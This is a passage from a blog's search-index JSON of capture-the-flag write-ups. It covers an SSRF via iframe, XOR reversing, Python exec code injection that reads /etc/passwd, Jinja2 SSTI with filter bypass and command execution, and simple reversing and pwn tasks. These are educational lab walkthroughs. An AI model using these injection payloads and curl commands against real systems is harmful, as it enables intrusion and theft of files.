(HTB{wh3n_th3_d3bugg3r_turns_4g41nst_th3_d3bugg33}):\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/baby-bonechewercon/","section":"ctf","summary":"PHP. Laravel Debugger","time":1,"title":"baby BoneChewerCon"},{"contents":"We have a Flask web application that allows us to render other websites inside it as an image:\nBehind the hoods, the server is launching a Headless Chrome with selenium, accessing the site we provided and taking a screenshot to show it. Here is an example:\nThe objective is to reach the endpoint /flag:\n@web.route('/flag') @is_from_localhost def flag(): return send_file('flag.png')  However, it is protected by checking that the request is done from 127.0.0.1 and has no Referer header:\ndef is_from_localhost(func): @functools.wraps(func) def check_ip(*args, **kwargs): if request.remote_addr != '127.0.0.1' or request.referrer: return abort(403) return func(*args, **kwargs) return check_ip  The idea is to create a web server that hosts this index.html file:\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;meta charset=\"utf-8\"\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe referrerpolicy=\"no-referrer\" src=\"http://127.0.0.1/flag\"\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  If the webapp is able to retrieve the file, then the iframe will be called from the proper server (the local Headless Chrome), and the request will be performed from localhost (127.0.0.1). Plus, specifying referrerpolicy=\u0026quot;no-referrer\u0026quot; we ensure that there will be no Referer header in the HTTP request.\nWe can easily create this server with Python (running python -m http.server will start a server on port 8000). And then, to make it accessible, we can use ngrok with the following command:\n$ ngrok http 8000 ngrok Session Status online Account Rocky (Plan: Free) Version 2.3.40 Region United States (us) Latency 104.541459ms Web Interface http://127.0.0.1:4040 Forwarding https://abcd-12-34-56-78.ngrok.io - http://localhost:8000 Connections ttl opn rt1 rt5 p50 p90 1 0 0.00 0.00 0.00 0.00  Now we take the public URL from ngrok and put it in the webapp. We will see some requests in the server log:\n$ python3 -m http.server Serving HTTP on :: port 8000 (http://[::]:8000/) ... ::1 - - [] \"GET / HTTP/1.1\" 200 - ::1 - - [] code 404, message File not found ::1 - - [] \"GET /favicon.ico HTTP/1.1\" 404 -  And then, the webapp will render an image containing the flag inside our iframe:\nAnd there\u0026rsquo;s the flag (HTB{reb1nd1ng_y0ur_dns_r3s0lv3r_0n3_qu3ry_4t_4_t1m3}):\nDespite getting the flag, the intended way is using DNS rebinding. The main idea is to enter a domain that resolves to an external IP address, and just after the check is passed, change the resolution to a local IP address (kind of a race condition), so that the /flag endpoint is accessed correctly.\nUsing ngrok (external) and the iframe without Referer header pointing to 127.0.0.1 (internal) makes it possible to bypass the two checks.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/baby-cachedview/","section":"ctf","summary":"SSRF using iframe","time":2,"title":"baby CachedView"},{"contents":"We have a binary called baby_crypt:\n$ file baby_crypt baby_crypt: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=24af7e68eab982022ea63c1828813c3bfa671b51, for GNU/Linux 3.2.0, not stripped  If we open it in Ghidra, we will see this main function:\nintmain() { char*key; longin_FS_OFFSET; inti; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined2 local_20; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); printf(\"Give me the key and I\\'ll give you the flag: \"); key =(char*) malloc(4); fgets(key, 4, stdin); local_38 =0x6f0547480c35643f; local_30 =0x28130304026f0446; local_28 =0x5000f4358280e52; local_20 =0x4d56; for(i =0; i \u0026lt;0x1a; i =i +1) { *(byte *) ((long) \u0026amp;local_38 +(long) i) =*(byte *) ((long) \u0026amp;local_38 +(long) i) ^key[i %3]; } printf(\"%.26s\\n\", \u0026amp;local_38); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return0; }  Basically, it asks for a 3-byte key and then performs a XOR cipher. Since the expected output is the flag and we know the format (HTB{...}), we can reverse the XOR cipher and get the expected key.\nLet $m$ be the plaintext byte, $k$ the key byte and $c$ be the ciphertext byte. XOR cipher has this property:\n$$ c = m \\oplus k \\iff k = c \\oplus m $$\nHence, we can take the first three bytes of the ciphertext (variable called local_38, in little-endian format) and XOR them with the plaintext bytes:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; chr(ord('H') ^ 0x3f) 'w' \u0026gt;\u0026gt;\u0026gt; chr(ord('T') ^ 0x64) '0' \u0026gt;\u0026gt;\u0026gt; chr(ord('B') ^ 0x35) 'w'  And we found the key (w0w). Let\u0026rsquo;s get the flag:\n$ ./baby_crypt Give me the key and I'll give you the flag: w0w HTB{x0r_1s_us3d_by_h4x0r!}  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/reversing/baby-crypt/","section":"ctf","summary":"XOR cipher","time":2,"title":"Baby Crypt"},{"contents":"We are provided with this webpage:\nIf we look into the HTML source code, we see /debug:\nAnd there we can find the source code of the web application:\nfromflaskimportFlask, Response, request, render_template, request fromrandomimportchoice, randint fromstringimportlowercase fromfunctoolsimportwraps app=Flask(__name__) defcalc(recipe): globalgarage garage={} try: exec(recipe, garage) except: pass defGCR(func): # Great Calculator of the observable universe and it's infinite timelines @wraps(func) deffederation(*args, **kwargs): ingredient=''.join(choice(lowercase) for_inrange(10)) recipe='%s= %s'%(ingredient, ''.join(map(str, [randint(1, 69), choice(['+', '-', '*']), randint(1,69)]))) ifrequest.method=='POST': ingredient=request.form.get('ingredient', '') recipe='%s= %s'%(ingredient, request.form.get('measurements', '')) calc(recipe) ifgarage.get(ingredient, ''): returnrender_template('index.html', calculations=garage[ingredient]) returnfunc(*args, **kwargs) returnfederation @app.route('/', methods=['GET', 'POST']) @GCR defindex(): returnrender_template('index.html') @app.route('/debug') defdebug(): returnResponse(open(__file__).read(), mimetype='text/plain') if__name__=='__main__': app.run('0.0.0.0', port=1337)  When we execute a POST request against /, we can provide ingredient and measurements parameters and control the recipe variable:\nifrequest.method=='POST': ingredient=request.form.get('ingredient', '') recipe='%s= %s'%(ingredient, request.form.get('measurements', '')) calc(recipe) ifgarage.get(ingredient, ''): returnrender_template('index.html', calculations=garage[ingredient])  And calc function allows us to execute Python code with exec:\ndefcalc(recipe): globalgarage garage={} try: exec(recipe, garage) except: pass  So we can get something like this:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; ingredient = 'asdf' \u0026gt;\u0026gt;\u0026gt; measurements = 1337 \u0026gt;\u0026gt;\u0026gt; recipe = '%s = %s' % (ingredient, measurements) \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; garage = {} \u0026gt;\u0026gt;\u0026gt; exec(recipe, garage) \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; garage[ingredient] 1337  The idea here is that 1337 is replaced with the content of a remote file. For this, we can search in PayloadsAllTheThings:\n''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()  $ curl 167.99.202.193:30358 -d \"ingredient=asdf\u0026measurements=''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()\" \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name='viewport' content='width=device-width, initial-scale=1'\u0026gt; \u0026lt;meta name='author' content='makelaris'\u0026gt; \u0026lt;title\u0026gt;🌌 on Venzenulon 9\u0026lt;/title\u0026gt; \u0026lt;link rel='stylesheet' href='//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css' integrity='sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T' crossorigin='anonymous'\u0026gt; \u0026lt;link href='//fonts.googleapis.com/css?family=Comfortaa' rel='stylesheet' type='text/css'\u0026gt; \u0026lt;style\u0026gt;html, body {background-image: url('//s-media-cache-ak0.pinimg.com/736x/7b/fe/d2/7bfed2ffe038beb673efd872cd44ba2c.jpg');} h1 {display: flex; justify-content: center; color: #6200ea; font-family: Comfortaa;}\u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img class='mx-auto d-block img-responsive' src='//media3.giphy.com/media/eO8zgwAt3MVW/giphy.gif'\u0026gt; \u0026lt;h1 style='font-size: 140px; text-shadow: 2px 2px 0 #0C3447, 5px 5px 0 #6a1b9a, 10px 10px 0 #00131E;'\u0026gt;root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin postgres:x:70:70::/var/lib/postgresql:/bin/sh cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin \u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- /debug --\u0026gt; \u0026lt;/html\u0026gt;  And there we have the /etc/passwd file. Let\u0026rsquo;s get the flag file:\n$ curl 167.99.202.193:30358 -d \"ingredient=asdf\u0026measurements='\\\\n'%2b''.__class__.__mro__[2].__subclasses__()[40]('flag').read()\" \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name='viewport' content='width=device-width, initial-scale=1'\u0026gt; \u0026lt;meta name='author' content='makelaris'\u0026gt; \u0026lt;title\u0026gt;🌌 on Venzenulon 9\u0026lt;/title\u0026gt; \u0026lt;link rel='stylesheet' href='//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css' integrity='sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T' crossorigin='anonymous'\u0026gt; \u0026lt;link href='//fonts.googleapis.com/css?family=Comfortaa' rel='stylesheet' type='text/css'\u0026gt; \u0026lt;style\u0026gt;html, body {background-image: url('//s-media-cache-ak0.pinimg.com/736x/7b/fe/d2/7bfed2ffe038beb673efd872cd44ba2c.jpg');} h1 {display: flex; justify-content: center; color: #6200ea; font-family: Comfortaa;}\u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img class='mx-auto d-block img-responsive' src='//media3.giphy.com/media/eO8zgwAt3MVW/giphy.gif'\u0026gt; \u0026lt;h1 style='font-size: 140px; text-shadow: 2px 2px 0 #0C3447, 5px 5px 0 #6a1b9a, 10px 10px 0 #00131E;'\u0026gt; HTB{n3v3r_trust1ng_us3r_1nput_ag41n_1n_my_l1f3}\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- /debug --\u0026gt; \u0026lt;/html\u0026gt;  Another way of finding the flag file is obtaining Remote Code Execution using a different payload.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/baby-interdimensional-internet/","section":"ctf","summary":"Code injection. Read remote file","time":2,"title":"baby interdimensional internet"},{"contents":"We are provided with this web page:\nThere is an HTML comment on the index.html that points to a debugging URL (/debug):\nIn this /debug endpoint, the source code is found:\n$ curl 157.245.33.77:31650/debug  from flask import Flask, session, render_template, request, Response, render_template_string, g import functools, sqlite3, os app = Flask(__name__) app.config['SECRET_KEY'] = os.urandom(120) acc_tmpl = '''{% extends 'index.html' %} {% block content %} \u0026lt;h3\u0026gt;baby_ninja joined, total number of rebels: reb_num\u0026lt;br\u0026gt; {% endblock %} ''' def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect('/tmp/ninjas.db') db.isolation_level = None db.row_factory = sqlite3.Row db.text_factory = (lambda s: s.replace('{{', ''). replace(\"'\", '\u0026amp;#x27;'). replace('\"', '\u0026amp;quot;'). replace('\u0026lt;', '\u0026amp;lt;'). replace('\u0026gt;', '\u0026amp;gt;') ) return db def query_db(query, args=(), one=False): with app.app_context(): cur = get_db().execute(query, args) rv = [dict((cur.description[idx][0], str(value)) \\ for idx, value in enumerate(row)) for row in cur.fetchall()] return (rv[0] if rv else None) if one else rv @app.before_first_request def init_db(): with app.open_resource('schema.sql', mode='r') as f: get_db().cursor().executescript(f.read()) @app.teardown_appcontext def close_connection(exception): db = getattr(g, '_database', None) if db is not None: db.close() def rite_of_passage(func): @functools.wraps(func) def born2pwn(*args, **kwargs): name = request.args.get('name', '') if name: query_db('INSERT INTO ninjas (name) VALUES (\"%s\")' % name) report = render_template_string(acc_tmpl. replace('baby_ninja', query_db('SELECT name FROM ninjas ORDER BY id DESC', one=True)['name']). replace('reb_num', query_db('SELECT COUNT(id) FROM ninjas', one=True).itervalues().next()) ) if session.get('leader'): return report return render_template('welcome.jinja2') return func(*args, **kwargs) return born2pwn @app.route('/') @rite_of_passage def index(): return render_template('index.html') @app.route('/debug') def debug(): return Response(open(__file__).read(), mimetype='text/plain') if __name__ == '__main__': app.run(host='0.0.0.0', port=1337, debug=True)  As it is using Flask as web framework and Jinja2 as template engine, the vulnerability is related to Server-Side Template Injection (SSTI).\nThe server is filtering some characters to try to prevent SSTI, so these characters cannot be used in the payload:\n{{ ' \"  However, we can still use some bypassing techniques to execute commands without using those characters. Looking at PayloadsAllTheThings, we can find these payloads:\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen(request.args.input).read() }}{% endif %}{% endfor %} http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}\u0026f=%s%sclass%s%s\u0026a=_  So we can enter strings in our payload using more URL query parameters, and we avoid using {{ ... }} by employing a block {% ... %}.\nWe can control some output of the HTML response if our session has a leader key, so we can add it using SSTI and show the controlled input:\n$ curl -siGX GET 157.245.33.77:31650 --data-urlencode 'name={% if session.update({request.args.leader: True}) or True %} asdf {% endif %}' --data-urlencode leader=leader | grep asdf \u0026lt;h3\u0026gt; asdf joined, total number of rebels: 13\u0026lt;br\u0026gt;  However, since we cannot use {{, we won\u0026rsquo;t be able to visualize command outputs. Moreover, the remote instance does not have Internet connection, so reverse shells are not possible.\nThe session modification might be a hint, because we can actually employ the session dictionary to introduce the output of our commands. For example:\n$ curl -siGX GET 157.245.33.77:31650 --data-urlencode 'name={% if session.update({request.args.c: cycler.__init__.__globals__.os.popen(request.args.cmd).read().decode()}) %}{% endif %}' --data-urlencode c=c --data-urlencode cmd=whoami | grep session Set-Cookie: session=eyJjIjoibm9ib2R5XG4ifQ.Yo1aQQ.Z_2DY8zZX4NhCASvRpQKwdKp6-o; HttpOnly; Path=/ $ echo eyJjIjoibm9ib2R5XG4ifQ | base64 -d {\"c\":\"nobody\\n\" $ curl -siGX GET 157.245.33.77:31650 --data-urlencode 'name={% if session.update({request.args.c: cycler.__init__.__globals__.os.popen(request.args.cmd).read().decode()}) %}{% endif %}' --data-urlencode c=c --data-urlencode cmd=whoami | grep session | awk -F = '{ print $2 }' | awk -F . '{ print $1 }' | base64 -d {\"c\":\"nobody\\n\"  Now, we can wrap all this filters into a Bash function to execute commands easily:\n$ function exec_cmd() { curl -siGX GET 157.245.33.77:31650 --data-urlencode 'name={% if session.update({request.args.c: cycler.__init__.__globals__.os.popen(request.args.cmd).read().decode()}) %}{% endif %}' --data-urlencode c=c --data-urlencode \"cmd=$1\" | grep session | awk -F = '{ print $2 }' | awk -F . '{ print $1 }' | base64 -d } $ exec_cmd whoami {\"c\":\"nobody\\n\"  At this point, we can search for the flag and capture it:\n$ exec_cmd ls {\"c\":\"app.py\\nflag_P54ed\\nschema.sql\\nstatic\\ntemplates\\n $ exec_cmd 'cat flag*' {\"c\":\"HTB{b4by_ninj4s_d0nt_g3t_qu0t3d_0r_c4ughT}\\n\"  Additionally, I wrote a Python script to automate the command execution and filtering: ssti.py (detailed explanation here).\n$ python3 ssti.py 157.245.33.77:31650 $ whoami nobody $ ls app.py flag_P54ed schema.sql static templates $ cat flag_P54ed HTB{b4by_ninj4s_d0nt_g3t_qu0t3d_0r_c4ughT}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/baby-ninja-jinja/","section":"ctf","summary":"SSTI with limited characters","time":4,"title":"baby ninja jinja"},{"contents":"We have a binary called baby:\n$ file baby baby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=25adc53b89f781335a27bf1b81f5c4cb74581022, for GNU/Linux 3.2.0, not stripped  If we run it, it asks for a key:\n$ ./baby Insert key:  We can introduce something and see that it is not correct:\n$ ./baby Insert key: 1234 Try again later.  We can make use of ltrace to see every call to external functions (functions that belong to a library like Glibc):\n$ ltrace ./baby puts(\"Insert key: \"Insert key: ) = 13 fgets(  For example, it uses puts to print the message and fgets to read our input. If we enter some text, we see something really interesting:\n$ ltrace ./baby puts(\"Insert key: \"Insert key: ) = 13 fgets(1234 \"1234\\n\", 20, 0x7fb37e452980) = 0x7fffa441c7a0 strcmp(\"1234\\n\", \"abcde122313\\n\") = -48 puts(\"Try again later.\"Try again later. ) = 17 +++ exited (status 0) +++  It is comparing our input with \u0026quot;abcde122313\\n\u0026quot;, so this is the key we need to enter:\n$ ./baby Insert key: abcde122313 HTB{B4BY_R3V_TH4TS_EZ}  There are three more ways to complete this challenge:\n Decompile the binary with Ghidra or IDA to see the strcmp instruction. Use a debugger like GDB and check the expected value of the key. Run strings on the binary to see the valid key.  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/reversing/baby-re/","section":"ctf","summary":"Key written in a binary","time":2,"title":"Baby RE"},{"contents":"We are given a binary called chall:\n$ file chall chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=151528987cd274999ec93665ef2d6a7678c5107b, for GNU/Linux 3.2.0, stripped  When we execute, it asks for the flag:\n$ ./chall Hello! Welcome to SEETF. Please enter the flag. SEE{asdf} Flag wrong. Try again.  Let\u0026rsquo;s open the binary in Ghidra to analyze the decompiled C code. This is the main function. It is a bit overwhelming because there are a lot of assignments:\nundefined8 main() { char *pcVar1; undefined4 *puVar2; size_t length; ulong i; ulong i_copy; char flag_input[128]; undefined4 local_d8[4]; undefined4 local_c8; undefined4 uStack196; undefined4 uStack192; undefined4 uStack188; undefined4 local_b8; undefined4 uStack180; undefined4 uStack176; undefined4 uStack172; undefined4 local_a8; undefined4 uStack164; undefined4 uStack160; undefined4 uStack156; undefined4 local_98; undefined4 uStack148; undefined4 uStack144; undefined4 uStack140; undefined4 local_88; undefined4 uStack132; undefined4 uStack128; undefined4 uStack124; undefined4 local_78; undefined4 uStack116; undefined4 uStack112; undefined4 uStack108; undefined4 local_68; undefined4 uStack100; undefined4 uStack96; undefined4 uStack92; undefined4 local_58; undefined4 uStack84; undefined4 uStack80; undefined4 uStack76; undefined4 local_48; undefined4 uStack68; undefined4 uStack64; undefined4 uStack60; undefined4 local_38; undefined4 uStack52; undefined4 uStack48; undefined4 uStack44; undefined4 local_28; undefined4 uStack36; undefined4 uStack32; undefined4 uStack28; undefined4 local_18; undefined4 uStack20; undefined4 uStack16; undefined4 uStack12; byte i_byte; puts(\"Hello! Welcome to SEETF. Please enter the flag.\"); local_d8[0] = 0x98; local_d8[1] = 0x8b; local_d8[2] = 0x88; local_d8[3] = 0xc3; local_c8 = 0x71; uStack196 = 0xb6; uStack192 = 0x7e; uStack188 = 0xa3; local_b8 = 0x72; uStack180 = 0xbb; uStack176 = 0x73; uStack172 = 0x7d; local_a8 = 0x7a; uStack164 = 0xa9; uStack160 = 0x74; uStack156 = 0x73; local_98 = 0x68; uStack148 = 0xa4; uStack144 = 0xb6; uStack140 = 0x6e; local_88 = 0x62; uStack132 = 0xbc; uStack128 = 0x61; uStack124 = 0x61; local_78 = 0x62; uStack116 = 0xb3; uStack112 = 0x67; uStack108 = 0xbc; local_68 = 0x61; uStack100 = 0x6b; uStack96 = 0xb8; uStack92 = 0xb5; local_58 = 0x56; uStack84 = 0x54; uStack80 = 0x89; uStack76 = 0x55; local_48 = 0x8c; uStack68 = 0x50; uStack64 = 0x5b; uStack60 = 0x51; local_38 = 0x53; uStack52 = 0x54; uStack48 = 0x5d; uStack44 = 0x5e; local_28 = 0x50; uStack36 = 0x86; uStack32 = 0x89; uStack28 = 0x89; local_18 = 0x48; uStack20 = 0x4f; uStack16 = 0x49; uStack12 = 0xf1; fgets(flag_input, 0x80, stdin); length = strlen(flag_input); if (length == 53) { puts(\"Good work! Your flag is the correct size.\"); puts(\"On to the flag check itself...\"); length = strlen(flag_input); i = 0; do { i_copy = i \u0026amp; 0xffffffff; if (length - 1 == i) { puts(\"Success! Go get your points, champ.\"); return 0; } pcVar1 = flag_input + i; puVar2 = local_d8 + i; i_byte = (byte) i; i = i + 1; } while ((byte) *puVar2 == (byte) (*pcVar1 + 0x45U ^ i_byte)); printf(\"Flag check failed at index: %d\", i_copy); } else { printf(\"Flag wrong. Try again.\"); } return 1; }  Notice that the flag must have 53 bytes (actually 52 because the last one is a new line character):\n$ python3 -c 'print(\"A\" * 47)' AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA $ ./chall Hello! Welcome to SEETF. Please enter the flag. SEE{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA} Good work! Your flag is the correct size. On to the flag check itself... Flag check failed at index: 4  Here we have two ways to solve the challenge. One is to test every character (let\u0026rsquo;s say index 4) of the flag until we get a message \u0026quot;Flag check failed at index: 5\u0026quot;. Then we can construct the flag one character at a time.\nHowever, I found it nicer to reverse the algorithm to encrypt the flag (that uses XOR), since we know how our input is being encrypted and compared to the real encrypted flag.\nThis is the solution script:\n#!/usr/bin/env python3 flag_enc = [ 0x98, 0x8b, 0x88, 0xc3, 0x71, 0xb6, 0x7e, 0xa3, 0x72, 0xbb, 0x73, 0x7d, 0x7a, 0xa9, 0x74, 0x73, 0x68, 0xa4, 0xb6, 0x6e, 0x62, 0xbc, 0x61, 0x61, 0x62, 0xb3, 0x67, 0xbc, 0x61, 0x6b, 0xb8, 0xb5, 0x56, 0x54, 0x89, 0x55, 0x8c, 0x50, 0x5b, 0x51, 0x53, 0x54, 0x5d, 0x5e, 0x50, 0x86, 0x89, 0x89, 0x48, 0x4f, 0x49, 0xf1 ] fori, cinenumerate(flag_enc): print(chr(((c^i) -0x45)), end='')  $ python3 solve.py SEE{0n3_5m411_573p_81d215e8b81ae10f1c08168207fba396}  The full script can be found in here: solve.py.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/other/babyreeee/","section":"ctf","summary":"SEETF 2022. Revert encryption algorithm. XOR","time":4,"title":"babyreeee"},{"contents":"We are given this string:\nQ1RGbGVhcm57RmxhZ2d5V2FnZ3lSYWdneX0K\nSince it has numbers, lowercase letters and uppercase letters, it seems to be encoded in Base64.\nActually, the name of the challenge is \u0026ldquo;2 2 the 6\u0026rdquo; (\u0026ldquo;2 to the 6\u0026rdquo;), so $2^6 = 64$.\nWe can decode it using a shell:\n$ echo Q1RGbGVhcm57RmxhZ2d5V2FnZ3lSYWdneX0K | base64 -d CTFlearn{FlaggyWaggyRaggy}  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/base-2-2-the-6/","section":"ctf","summary":"Base64 decoding","time":1,"title":"Base 2 2 the 6"},{"contents":"We are asked to represent 51 in base 12. This is simple:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; def dec_to_base(n: int, b: int) - int: ... digits = [] ... while n: ... digits.append(n % b) ... n //= b ... return int(''.join(map(str, digits[::-1]))) ... \u0026gt;\u0026gt;\u0026gt; dec_to_base(51, 12) 43 \u0026gt;\u0026gt;\u0026gt; 4 * 12 + 3 51  So the flag is ictf{43}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/basic/","section":"ctf","summary":"ImaginaryCTF 03/07/2022. 30 points. Numerical base","time":1,"title":"basic"},{"contents":"We are given the C source code of a program that runs remotely:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #define WAIT 60 static const char* flag = \"[REDACTED]\"; static char data[10][100]; static int input_lengths[10]; static int inputs = 0; int tgetinput(char *input, unsigned int l) { fd_set input_set; struct timeval timeout; int ready_for_reading = 0; int read_bytes = 0; if(l \u0026lt;= 0) { printf(\"'l' for tgetinput must be greater than 0\\n\"); return -2; } /* Empty the FD Set */ FD_ZERO(\u0026amp;input_set); /* Listen to the input descriptor */ FD_SET(STDIN_FILENO, \u0026amp;input_set); /* Waiting for some seconds */ timeout.tv_sec = WAIT; // WAIT seconds timeout.tv_usec = 0; // 0 milliseconds /* Listening for input stream for any activity */ ready_for_reading = select(1, \u0026amp;input_set, NULL, NULL, \u0026amp;timeout); /* Here, first parameter is number of FDs in the set, * second is our FD set for reading, * third is the FD set in which any write activity needs to updated, * which is not required in this case. * Fourth is timeout */ if (ready_for_reading == -1) { /* Some error has occured in input */ printf(\"Unable to read your input\\n\"); return -1; } if (ready_for_reading) { read_bytes = read(0, input, l-1); if(input[read_bytes-1]=='\\n'){ --read_bytes; input[read_bytes]='\\0'; } if(read_bytes==0){ printf(\"No data given.\\n\"); return -4; } else { return 0; } } else { printf(\"Timed out waiting for user input. Press Ctrl-C to disconnect\\n\"); return -3; } return 0; } static void data_write() { char input[100]; char len[4]; long length; int r; printf(\"Please enter your data:\\n\"); r = tgetinput(input, 100); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } while (true) { printf(\"Please enter the length of your data:\\n\"); r = tgetinput(len, 4); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } if ((length = strtol(len, NULL, 10)) == 0) { puts(\"Please put in a valid length\"); } else { break; } } if (inputs \u0026gt; 10) { inputs = 0; } strcpy(data[inputs], input); input_lengths[inputs] = length; printf(\"Your entry number is: %d\\n\", inputs + 1); inputs++; } static void data_read() { char entry[4]; long entry_number; char output[100]; int r; memset(output, '\\0', 100); printf(\"Please enter the entry number of your data:\\n\"); r = tgetinput(entry, 4); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } if ((entry_number = strtol(entry, NULL, 10)) == 0) { puts(flag); fseek(stdin, 0, SEEK_END); exit(0); } entry_number--; strncpy(output, data[entry_number], input_lengths[entry_number]); puts(output); } int main(int argc, char** argv) { char input[3] = {'\\0'}; long command; int r; puts(\"Hi, welcome to my echo chamber!\"); puts(\"Type '1' to enter a phrase into our database\"); puts(\"Type '2' to echo a phrase in our database\"); puts(\"Type '3' to exit the program\"); while (true) { r = tgetinput(input, 3); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } if ((command = strtol(input, NULL, 10)) == 0) { puts(\"Please put in a valid number\"); } else if (command == 1) { data_write(); puts(\"Write successful, would you like to do anything else?\"); } else if (command == 2) { if (inputs == 0) { puts(\"No data yet\"); continue; } data_read(); puts(\"Read successful, would you like to do anything else?\"); } else if (command == 3) { return 0; } else { puts(\"Please type either 1, 2 or 3\"); puts(\"Maybe breaking boundaries elsewhere will be helpful\"); } } return 0; }  Static code analysis The important part is here:\nprintf(\"Please enter the entry number of your data:\\n\"); // ... if ((entry_number = strtol(entry, NULL, 10)) == 0) { puts(flag); fseek(stdin, 0, SEEK_END); exit(0); }  Flag So, if we enter 0 as the \u0026ldquo;entry number your data\u0026rdquo;, we will get the flag. We need to add data before printing the flag:\n$ nc saturn.picoctf.net 53641 Hi, welcome to my echo chamber! Type '1' to enter a phrase into our database Type '2' to echo a phrase in our database Type '3' to exit the program 1 1 Please enter your data: asdf asdf Please enter the length of your data: 4 4 Your entry number is: 1 Write successful, would you like to do anything else? 2 2 Please enter the entry number of your data: 0 0 picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_C5BC1889}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/basic-file-exploit/","section":"ctf","summary":"picoCTF 2022. 100 points. Coding bug exploit","time":4,"title":"basic-file-exploit"},{"contents":"We are given a 64-bit binary called batcomputer:\nArch: 